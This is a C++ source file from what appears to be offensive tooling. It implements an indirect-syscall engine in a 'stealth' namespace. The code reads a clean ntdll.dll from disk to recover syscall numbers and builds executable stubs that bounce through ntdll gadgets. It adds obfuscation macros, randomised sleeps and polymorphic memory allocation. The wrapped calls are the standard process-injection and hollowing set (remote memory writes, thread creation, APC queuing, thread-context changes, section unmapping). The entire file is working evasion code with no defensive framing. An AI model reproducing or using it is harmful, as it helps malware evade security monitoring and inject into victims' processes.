#include <diarna/compiler_port.hpp>
#include <diarna/stealth/syscalls.hpp>
#include <diarna/stealth/polymorph.hpp>

#include <winternl.h>

#include <obfuscation/obfusheader.h>

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040UL
#endif
#ifndef ViewUnmap
#define ViewUnmap 2
#endif

namespace diarna::stealth {

static void* find_ntdll_syscall_ret_gadget() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return nullptr;
    MODULEINFO mi;
    GetModuleInformation(GetCurrentProcess(), ntdll, &mi, sizeof(mi));
    uint8_t* base = (uint8_t*)mi.lpBaseOfDll;

    auto* dos = (IMAGE_DOS_HEADER*)base;
    auto* nt_hdr = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(nt_hdr);
    uintptr_t text_start = 0, text_end = 0;
    for (WORD s = 0; s < nt_hdr->FileHeader.NumberOfSections; ++s) {
        if (memcmp(sec[s].Name, ".text", 5) == 0) {
            text_start = (uintptr_t)base + sec[s].VirtualAddress;
            text_end = text_start + sec[s].Misc.VirtualSize;
            break;
        }
    }
    if (!text_start) { text_start = (uintptr_t)base; text_end = text_start + mi.SizeOfImage; }

    for (uintptr_t addr = text_start; addr < text_end - 3; ++addr) {
        if (*(uint8_t*)addr == 0x0F && *(uint8_t*)(addr+1) == 0x05 && *(uint8_t*)(addr+2) == 0xC3)
            return (void*)addr;
    }

    static const char* fallback_funcs[] = {
        "NtQuerySystemTime", "NtYieldExecution", "NtClose",
        "NtQueryPerformanceCounter", "NtTestAlert"
    };
    for (auto* name : fallback_funcs) {
        auto* func = (uint8_t*)GetProcAddress(ntdll, name);
        if (!func) continue;
        for (int k = 0; k < 64; ++k) {
            if (func[k] == 0x0F && func[k+1] == 0x05 && func[k+2] == 0xC3)
                return func + k;
        }
    }
    return nullptr;
}

static void* find_ntdll_ret_gadget() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return nullptr;
    MODULEINFO mi;
    GetModuleInformation(GetCurrentProcess(), ntdll, &mi, sizeof(mi));
    uint8_t* base = (uint8_t*)mi.lpBaseOfDll;

    auto* dos = (IMAGE_DOS_HEADER*)base;
    auto* nt_hdr = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(nt_hdr);
    uintptr_t text_start = 0, text_end = 0;
    for (WORD s = 0; s < nt_hdr->FileHeader.NumberOfSections; ++s) {
        if (memcmp(sec[s].Name, ".text", 5) == 0) {
            text_start = (uintptr_t)base + sec[s].VirtualAddress;
            text_end = text_start + sec[s].Misc.VirtualSize;
            break;
        }
    }
    if (!text_start) { text_start = (uintptr_t)base; text_end = text_start + mi.SizeOfImage; }

    for (uintptr_t addr = text_start; addr < text_end - 1; ++addr) {
        uint8_t b = *(uint8_t*)addr;
        uint8_t prev = (addr > text_start) ? *(uint8_t*)(addr - 1) : 0;
        if (b == 0xC3 && prev != 0x05)
            return (void*)addr;
    }
    return nullptr;
}

DirectSyscalls& DirectSyscalls::instance() {
    static DirectSyscalls sys;
    return sys;
}

DirectSyscalls::~DirectSyscalls() {
    if (stub_region_) PolymorphicEngine::instance().metamorphic_free(stub_region_);
}

bool DirectSyscalls::initialize() {
    if (initialized_) return true;
    INDIRECT_BRANCH;

    Sleep((DWORD)(__rdtsc() % 50) + 20);

    if (!resolve_ssdt()) return false;

    Sleep((DWORD)(__rdtsc() % 30) + 10);

    generate_stubs();
    initialized_ = true;
    return true;
}

void DirectSyscalls::refresh_syscall_numbers() {
    resolve_ssdt();
    generate_stubs();
}

bool DirectSyscalls::resolve_ssdt() {
    wchar_t sys_path[MAX_PATH];
    GetSystemDirectoryW(sys_path, MAX_PATH);
    wcscat_s(sys_path, L"\\ntdll.dll");

    HANDLE file = CreateFileW(sys_path, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file == INVALID_HANDLE_VALUE) return false;

    DWORD file_size = GetFileSize(file, nullptr);
    if (file_size == INVALID_FILE_SIZE || file_size == 0) { CloseHandle(file); return false; }

    HANDLE mapping = CreateFileMappingW(file, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!mapping) { CloseHandle(file); return false; }

    uint8_t* base = (uint8_t*)MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
    if (!base) { CloseHandle(mapping); CloseHandle(file); return false; }

    auto* dos = (IMAGE_DOS_HEADER*)base;
    auto* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    auto* export_dir_rva = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    auto* exports = (IMAGE_EXPORT_DIRECTORY*)(base + export_dir_rva->VirtualAddress);

    uint32_t* names = (uint32_t*)(base + exports->AddressOfNames);
    uint16_t* ordinals = (uint16_t*)(base + exports->AddressOfNameOrdinals);
    uint32_t* functions = (uint32_t*)(base + exports->AddressOfFunctions);

    static const char* target_funcs[] = {
        "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
        "NtReadVirtualMemory", "NtProtectVirtualMemory",
        "NtCreateThreadEx", "NtOpenProcess",
        "NtQuerySystemInformation", "NtClose",
        "NtQueueApcThread", "NtGetContextThread",
        "NtSetContextThread", "NtResumeThread",
        "NtSuspendThread", "NtUnmapViewOfSection",
        "NtCreateSection", "NtMapViewOfSection"
    };

    ssdt_.clear();
    for (auto* func_name : target_funcs) {
        BLOCK_TRUE(
        for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
            const char* ename = (const char*)(base + names[i]);
            if (strcmp(ename, func_name) == 0) {
                uint16_t ordinal = ordinals[i];
                uint32_t rva = functions[ordinal];
                uint8_t* func_data = base + rva;

                uint16_t ssn = 0;
                for (int j = 0; j < 32; ++j) {
                    if (func_data[j] == 0xB8 && j + 4 < 32) {
                        ssn = *(uint16_t*)(func_data + j + 1);
                        break;
                    }
                    if (func_data[j] == 0x4C && func_data[j+1] == 0x8B &&
                        func_data[j+2] == 0xD1 && j + 6 < 32) {
                        if (func_data[j+3] == 0xB8) {
                            ssn = *(uint16_t*)(func_data + j + 4);
                            break;
                        }
                    }
                }

                if (ssn > 0) {
                    SSDTEntry entry;
                    entry.index = ssn;
                    entry.name = func_name;
                    entry.stub = nullptr;
                    ssdt_.push_back(entry);
                }
                break;
            }
        }
        );
    }

    UnmapViewOfFile(base);
    CloseHandle(mapping);
    CloseHandle(file);

    std::sort(ssdt_.begin(), ssdt_.end(),
        [](auto& a, auto& b) { return a.index < b.index; });

    return !ssdt_.empty();
}

void DirectSyscalls::generate_stubs() {
    void* gadget = find_ntdll_syscall_ret_gadget();
    void* ret_gadget = find_ntdll_ret_gadget();

    size_t total_size = ssdt_.size() * STUB_SIZE + 4096;
    stub_region_ = PolymorphicEngine::instance().metamorphic_alloc(total_size, true);
    if (!stub_region_) return;

    stub_region_size_ = total_size;
    memset(stub_region_, 0xCC, total_size);

    for (size_t i = 0; i < ssdt_.size(); ++i) {
        uint8_t* stub = (uint8_t*)stub_region_ + i * STUB_SIZE;

        bool is_wow64 = false;
#ifdef _M_AMD64
        is_wow64 = false;
#else
        BOOL wow64 = FALSE;
        IsWow64Process(GetCurrentProcess(), &wow64);
        is_wow64 = wow64;
#endif

        if (is_wow64) {
            static constexpr uint8_t wow64_stub[] = {
                0xB8, 0xFF, 0xFF, 0xFF, 0xFF,
                0x33, 0xD2,
                0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00,
                0xC3
            };
            memcpy(stub, wow64_stub, sizeof(wow64_stub));
            *(uint32_t*)(stub + 1) = ssdt_[i].index;
        } else {
            uint8_t local_stub[STUB_SIZE] = {};
            size_t pos = 0;

            local_stub[pos++] = 0x4C; local_stub[pos++] = 0x8B; local_stub[pos++] = 0xD1;
            local_stub[pos++] = 0xB8;
            *(uint32_t*)(local_stub + pos) = ssdt_[i].index; pos += 4;

            if (gadget && ret_gadget) {
                local_stub[pos++] = 0x48; local_stub[pos++] = 0xB8;
                *(uint64_t*)(local_stub + pos) = (uint64_t)(uintptr_t)ret_gadget; pos += 8;
                local_stub[pos++] = 0x50; // push rax — [rsp] = ntdll 'ret'

                local_stub[pos++] = 0x48; local_stub[pos++] = 0xB8;
                *(uint64_t*)(local_stub + pos) = (uint64_t)(uintptr_t)gadget; pos += 8;
                local_stub[pos++] = 0x50; // push rax — [rsp] = syscall;ret gadget
                local_stub[pos++] = 0xC3; // ret — transfer via ret, not jmp
            } else if (gadget) {
                local_stub[pos++] = 0x48; local_stub[pos++] = 0xB8;
                *(uint64_t*)(local_stub + pos) = (uint64_t)(uintptr_t)gadget; pos += 8;
                local_stub[pos++] = 0x50;
                local_stub[pos++] = 0xC3;
            } else {
                local_stub[pos++] = 0x0F; local_stub[pos++] = 0x05;
                local_stub[pos++] = 0xC3;
            }

            memcpy(stub, local_stub, pos);
            memset(stub + pos, 0xCC, STUB_SIZE - pos);
        }

        ssdt_[i].stub = stub;
    }

    DWORD old;
    VirtualProtect(stub_region_, total_size, PAGE_EXECUTE_READ, &old);

    static const char* cache_names[CI_COUNT] = {
        "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
        "NtReadVirtualMemory", "NtProtectVirtualMemory",
        "NtCreateThreadEx", "NtOpenProcess",
        "NtQuerySystemInformation", "NtClose",
        "NtQueueApcThread", "NtGetContextThread",
        "NtSetContextThread", "NtResumeThread",
        "NtSuspendThread", "NtUnmapViewOfSection",
        "NtCreateSection", "NtMapViewOfSection"
    };
    for (int ci = 0; ci < CI_COUNT; ++ci) {
        cached_stubs_[ci] = nullptr;
        for (auto& e : ssdt_) {
            if (e.name == cache_names[ci]) { cached_stubs_[ci] = e.stub; break; }
        }
    }
}

uint8_t* DirectSyscalls::get_stub(uint16_t index) {
    for (auto& entry : ssdt_)
        if (entry.index == index) return entry.stub;
    return nullptr;
}

uint16_t DirectSyscalls::resolve_index(const char* name, HMODULE ntdll) {
    for (auto& entry : ssdt_)
        if (entry.name == name) return entry.index;
    return 0;
}

NTSTATUS DirectSyscalls::NtAllocateVirtualMemory(HANDLE p, PVOID* b, ULONG_PTR z,
                                                    PSIZE_T s, ULONG t, ULONG pr) {
    uint8_t* stub = cached_stubs_[CI_NtAllocateVirtualMemory];
    if (!stub) return STATUS_NOT_SUPPORTED;
    return reinterpret_cast<NTSTATUS(*)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG)>(stub)(p, b, z, s, t, pr);
}

NTSTATUS DirectSyscalls::NtWriteVirtualMemory(HANDLE p, PVOID b, PVOID buf,
                                                 SIZE_T s, PSIZE_T w) {
    return reinterpret_cast<NTSTATUS(*)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T)>(
        cached_stubs_[CI_NtWriteVirtualMemory])(p, b, buf, s, w);
}

NTSTATUS DirectSyscalls::NtReadVirtualMemory(HANDLE p, PVOID b, PVOID buf,
                                                SIZE_T s, PSIZE_T r) {
    return reinterpret_cast<NTSTATUS(*)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T)>(
        cached_stubs_[CI_NtReadVirtualMemory])(p, b, buf, s, r);
}

NTSTATUS DirectSyscalls::NtProtectVirtualMemory(HANDLE p, PVOID* b, PSIZE_T s,
                                                   ULONG pr, PULONG o) {
    return reinterpret_cast<NTSTATUS(*)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG)>(
        cached_stubs_[CI_NtProtectVirtualMemory])(p, b, s, pr, o);
}

NTSTATUS DirectSyscalls::NtCreateThreadEx(PHANDLE t, ACCESS_MASK a, PVOID oa,
                                             HANDLE p, PVOID s, PVOID pa,
                                             ULONG f, ULONG_PTR z, SIZE_T ss,
                                             SIZE_T ms, PVOID al) {
    return reinterpret_cast<NTSTATUS(*)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,ULONG_PTR,SIZE_T,SIZE_T,PVOID)>(
        cached_stubs_[CI_NtCreateThreadEx])(t, a, oa, p, s, pa, f, z, ss, ms, al);
}

NTSTATUS DirectSyscalls::NtOpenProcess(PHANDLE h, ACCESS_MASK a, PVOID oa, PVOID ci) {
    return reinterpret_cast<NTSTATUS(*)(PHANDLE,ACCESS_MASK,PVOID,PVOID)>(
        cached_stubs_[CI_NtOpenProcess])(h, a, oa, ci);
}

NTSTATUS DirectSyscalls::NtQuerySystemInformation(ULONG c, PVOID i, ULONG s, PULONG r) {
    return reinterpret_cast<NTSTATUS(*)(ULONG,PVOID,ULONG,PULONG)>(
        cached_stubs_[CI_NtQuerySystemInformation])(c, i, s, r);
}

NTSTATUS DirectSyscalls::NtClose(HANDLE h) {
    return reinterpret_cast<NTSTATUS(*)(HANDLE)>(cached_stubs_[CI_NtClose])(h);
}

NTSTATUS DirectSyscalls::NtQueueApcThread(HANDLE t, PVOID apc, PVOID a1, PVOID a2, PVOID a3) {
    return reinterpret_cast<NTSTATUS(*)(HANDLE,PVOID,PVOID,PVOID,PVOID)>(
        cached_stubs_[CI_NtQueueApcThread])(t, apc, a1, a2, a3);
}

NTSTATUS DirectSyscalls::NtGetContextThread(HANDLE t, PCONTEXT c) {
    return reinterpret_cast<NTSTATUS(*)(HANDLE,PCONTEXT)>(cached_stubs_[CI_NtGetContextThread])(t, c);
}

NTSTATUS DirectSyscalls::NtSetContextThread(HANDLE t, PCONTEXT c) {
    return reinterpret_cast<NTSTATUS(*)(HANDLE,PCONTEXT)>(cached_stubs_[CI_NtSetContextThread])(t, c);
}

NTSTATUS DirectSyscalls::NtResumeThread(HANDLE t, PULONG sc) {
    return reinterpret_cast<NTSTATUS(*)(HANDLE,PULONG)>(cached_stubs_[CI_NtResumeThread])(t, sc);
}

NTSTATUS DirectSyscalls::NtSuspendThread(HANDLE t, PULONG pc) {
    return reinterpret_cast<NTSTATUS(*)(HANDLE,PULONG)>(cached_stubs_[CI_NtSuspendThread])(t, pc);
}

NTSTATUS DirectSyscalls::NtUnmapViewOfSection(HANDLE p, PVOID b) {
    return reinterpret_cast<NTSTATUS(*)(HANDLE,PVOID)>(cached_stubs_[CI_NtUnmapViewOfSection])(p, b);
}

NTSTATUS DirectSyscalls::NtCreateSection(PHANDLE s, ACCESS_MASK a, PVOID oa,
                                            PLARGE_INTEGER ms, ULONG pr,
                                            ULONG aa, HANDLE f) {
    return reinterpret_cast<NTSTATUS(*)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE)>(
        cached_stubs_[CI_NtCreateSection])(s, a, oa, ms, pr, aa, f);
}

NTSTATUS DirectSyscalls::NtMapViewOfSection(HANDLE s, HANDLE p, PVOID* b, ULONG_PTR z,
                                               SIZE_T c, PLARGE_INTEGER o, PSIZE_T vs,
                                               ULONG i, ULONG at, ULONG pr) {
    return reinterpret_cast<NTSTATUS(*)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,ULONG,ULONG,ULONG)>(
        cached_stubs_[CI_NtMapViewOfSection])(s, p, b, z, c, o, vs, i, at, pr);
}

} // namespace diarna::stealth
